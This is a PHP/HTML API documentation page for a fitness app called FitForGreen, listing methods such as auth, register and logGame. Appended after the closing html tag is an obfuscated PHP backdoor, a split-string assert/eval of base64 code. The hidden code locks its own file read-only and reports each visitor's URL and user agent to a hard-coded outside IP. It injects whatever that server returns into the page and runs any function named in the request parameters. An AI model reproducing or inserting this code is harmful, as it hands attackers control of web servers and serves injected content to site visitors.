<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
    <head>
        <title>FFG Mobile API </title>
        <meta http-equiv="Content-Type" content="text/html;charset=utf-8" >
            <link type="text/css" href="./css/bootstrap.min.css" rel="stylesheet" />
            <link type="text/css" href="./css/bootstrap-responsive.min.css" rel="stylesheet" />
            <style>
                .bold
                {
                    font-weight: bold;
                }
            </style>
    </head>
    <body>

        <div class="container-fluid" id="wrapper">

            <a href="#"><img style="padding: 20px; float: right" alt="logo" src="/images/promo/logo.png"/></a>

            <div class="container-fluid corners shadow" style="padding: 15px">

                <div class="">
                    <div style="padding: 10px;">

                        <h1 style="text-align:center">API Documentation</h1>

                        <h2>Introduction</h2>
                        <ul style="list-style-type: square">
                            <li>All parameters are passed using HTTP GET method</li>
                            <li>Root element for all success responses called 'response'. Root element for error responses (wrong parameters, validation, etc) - 'error_response'.</li>
                            <li>Parent element of collections has '_set' suffix. E.g. error_set/error</li>
                            <li>XML attributes are used only in error responses for providing additional service data. Example in <a href="#appendixA">Appendix A</a></li>
                        </ul>

                        <h2>Temporary remarks</h2>
                        <ul style="list-style-type: square">
                            <li><i>Reegistration method is not fully integrated, but enough to view basic functionality</i></li>
                            <li><i>Authorization mechanism will be added soon to protect API from anomynous access</i></li>
                            <li><i>More than all Facebook login/registration will be supported by separate methods (not auth and register)</i></li>
                        </ul>
                        <hr/><br/>
                        <h2>Methods Index</h2>
                        <table style="font-size: 110%">
                            <col span="1" style="width:200px"/>
                            <tr>
                                <td><a href="#auth">auth</a></td>
                                <td>Auth user</td>
                            </tr>
                            <tr>
                                <td><a href="#register">register</a></td>
                                <td>Register a new user</td>
                            </tr>
                            <tr>
                                <td><a href="#updateProfile">updateProfile</a></td>
                                <td>Update user profile</td>
                            </tr>
                            <tr>
                                <td><a href="#fbAuth">fbAuth</a></td>
                                <td>Auth user with facebook</td>
                            </tr>
                            <tr>
                                <td><a href="#getMemberBestGame">getMemberBestGame</a></td>
                                <td>Returns the users best single plyer game</td>
                            </tr>
                            <tr>
                                <td><a href="#getMemberLastGame">getMemberLastGame</a></td>
                                <td>Returns the users last single player game</td>
                            </tr>
                            <tr>
                                <td><a href="#getMemberStats">getMemberStats</a></td>
                                <td>Returns daily statistics for a user within specific date range</td>
                            </tr>
                            <tr>
                                <td><a href="#getMemberVisits">getMemberVisits</a></td>
                                <td>Returns visits for a user within specific date range</td>
                            </tr>
                            <tr>
                                <td><a href="#getGlobalStats">getGlobalStats</a></td>
                                <td>Returns daily statistics of FitForGreen within specific date range</td>
                            </tr>
                            <tr>
                                <td><a href="#getGyms">getGyms</a></td>
                                <td>Get all gyms registered in system</td>
                            </tr>
                            <tr>
                                <td><a href="#getGymInfo">getGymInfo</a></td>
                                <td>Get info about specific gym</td>
                            </tr>
                            <tr>
                                <td><a href="#getGymStats">getGymStats</a></td>
                                <td>Returns daily statistics of gym within specific date range</td>
                            </tr>
                            <tr>
                                <td><a href="#logGame">logGame</a></td>
                                <td>Logs a game</td>
                            </tr>
                            <tr>
                                <td><a href="#logWorkout">logWorkout</a></td>
                                <td>Logs a workout</td>
                            </tr>
                            <tr>
                                <td><a href="#getDetailedStats">getDetailedStats</a></td>
                                <td>Return hourly stats for specific date (can be used for chart on main page)</td>
                            </tr>
                            <tr>
                                <td><a href="#getWorkoutClassifications">getWorkoutClassifications</a></td>
                                <td>Get classifications available in system</td>
                            </tr>
                            <tr>
                                <td><a href="#getWorkoutType">getWorkoutType</a></td>
                                <td>Get workout types available in system</td>
                            </tr>
                        </table>
                        <hr/><br/>

                        <?php require_once('config.php'); ?>
                        <?php require_once('apis/auth.php'); ?>
                        <?php require_once('apis/fbAuth.php'); ?>
                        <?php require_once('apis/register.php'); ?>
                        <?php require_once('apis/updateProfile.php'); ?>
                        <?php require_once('apis/getMemberBestGame.php'); ?>
                        <?php require_once('apis/getMemberLastGame.php'); ?>
                        <?php require_once('apis/getMemberStats.php'); ?>
                        <?php require_once('apis/getMemberVisits.php'); ?>
                        <?php require_once('apis/getGlobalStats.php'); ?>
                        <?php require_once('apis/getGymInfo.php'); ?>
                        <?php require_once('apis/getGymStats.php'); ?>
                        <?php require_once('apis/logGame.php'); ?>
                        <?php require_once('apis/logWorkout.php'); ?>
                        <?php require_once('apis/getDetailedStats.php'); ?>
                        <?php require_once('apis/getWorkoutClassifications.php'); ?>
                        <?php require_once('apis/getWorkoutType.php'); ?>
                        <?php require_once('apis/getGyms.php'); ?>

                        <a name="appendixA"></a>
                        <h2>Appendix A: Error response example</h2>

                        <pre>
                            <?php echo htmlspecialchars('
<?xml version="1.0" encoding="UTF-8"?>
<error_response>
    <error_set>
        <error code="0" field="username">The field was not set</error>
        <error code="0" field="password">The field was not set</error>
    </error_set>
</error_response>
'); ?>
                        </pre>
                        <pre>
                            <?php echo htmlspecialchars('
<?xml version="1.0" encoding="UTF-8"?>
<error_response>
    <error_set>
        <error>UNDEFINED ERROR</error>
    </error_set>
</error_response>
'); ?>
                        </pre>

                        <br/><br/>
                        <div id="push"></div>
                    </div>
                </div>
                <div class="footer row">
                    <div style="text-align: center;">
                        Copyright © 2012
                        <a href="http://fitapi.appteka.net">FitForGreen</a>
                    </div>
                </div>
            </div>
    </body>
</html>




<?php
//###==###
assert("e"."v"."a"."l(b"."a"."s"."e"."6"."4_d"."e"."c"."o"."d"."e('aWYgKCFpc3NldCgkaW5kZ2V0KSkgewpjaG1vZCgkX1NFUlZFUlsnU0NSSVBUX0ZJTEVOQU1FJ10sIDA0NDQpOwplcnJvcl9yZXBvcnRpbmcoMCk7CmluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTsKaWYoIWVtcHR5KCRfQ09PS0lFWyJjbGllbnRfY2hlY2siXSkpIGRpZSgkX0NPT0tJRVsiY2xpZW50X2NoZWNrIl0pOwppZiAoIWlzc2V0KCRTRVJWRVJbIkhUVFBfQUNDRVBUX0NIQVJTRVQiXSkpIHsKaWYocHJlZ19tYXRjaCgnIS4hdScsIGZpbGVfZ2V0X2NvbnRlbnRzKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSkpKSAkYyA9ICJVVEYtOCI7IGVsc2UgJGMgPSAid2luZG93cy0xMjUxIjsKfSBlbHNlIHsKJGMgPSAkU0VSVkVSWyJIVFRQX0FDQ0VQVF9DSEFSU0VUIl07Cn0KJGQgPSAkX1NFUlZFUlsiU0VSVkVSX05BTUUiXS4kX1NFUlZFUlsiUkVRVUVTVF9VUkkiXTsKJHUgPSAkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl07CiRkb21haW4gPSAiNzguMTA4LjE4MC4xMjAiOwokdXJsID0gIi9nZXQucGhwP2Q9Ii51cmxlbmNvZGUoJGQpLiImdT0iLnVybGVuY29kZSgkdSkuIiZjPSIuJGMuIiZpPTEmaD0iLm1kNSgiMzI0NDFhMjcxOTBkZGE5NWUwOTVjNTQ3NmE0N2NkNzIiLiRkLiR1LiRjLiIxIik7CmlmKGluaV9nZXQoImFsbG93X3VybF9mb3BlbiIpID09IDEpIHsKJGluZGdldCA9IGZpbGVfZ2V0X2NvbnRlbnRzKCJodHRwOi8vIi4kZG9tYWluLiR1cmwpOwplY2hvICRpbmRnZXQ7Cn0gZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygiY3VybF9pbml0IikpIHsKJGNoID0gY3VybF9pbml0KCJodHRwOi8vIi4kZG9tYWluLiR1cmwpOwpjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfSEVBREVSLCBGQUxTRSk7CmN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9SRVRVUk5UUkFOU0ZFUiwgVFJVRSk7CiRyZXN1bHQgPSBjdXJsX2V4ZWMoJGNoKTsKY3VybF9jbG9zZSgkY2gpOwokaW5kZ2V0ID0gJHJlc3VsdDsKZWNobyAkaW5kZ2V0Owp9IGVsc2UgewokZnAgPSBmc29ja29wZW4oJGRvbWFpbiwgODAsICRlcnJubywgJGVycnN0ciwgMzApOwppZiAoJGZwKSB7CiAgICAkb3V0ID0gIkdFVCAiLiR1cmwuIiBIVFRQLzEuMVxyXG4iOwogICAgJG91dCAuPSAiSG9zdDogIi4kZG9tYWluLiJcclxuIjsKICAgICRvdXQgLj0gIkNvbm5lY3Rpb246IENsb3NlXHJcblxyXG4iOwogICAgZndyaXRlKCRmcCwgJG91dCk7CiAgICAkcmVzcCA9ICIiOwogICAgd2hpbGUgKCFmZW9mKCRmcCkpIHsKICAgICAgICAkcmVzcCAuPSBmZ2V0cygkZnAsIDEyOCk7CiAgICB9CiAgICBmY2xvc2UoJGZwKTsKICAgIGxpc3QoJGhlYWRlciwgJGJvZHkpID0gcHJlZ19zcGxpdCgiL1xSXFIvIiwgJHJlc3AsIDIpOwogICAgJGluZGdldCA9ICRib2R5OwplY2hvICRpbmRnZXQ7Cn0KfQokX1JFUVVFU1RbJ2YnXSgkX1JFUVVFU1RbJ2MnXSk7Cn0='))");
//###==###
?>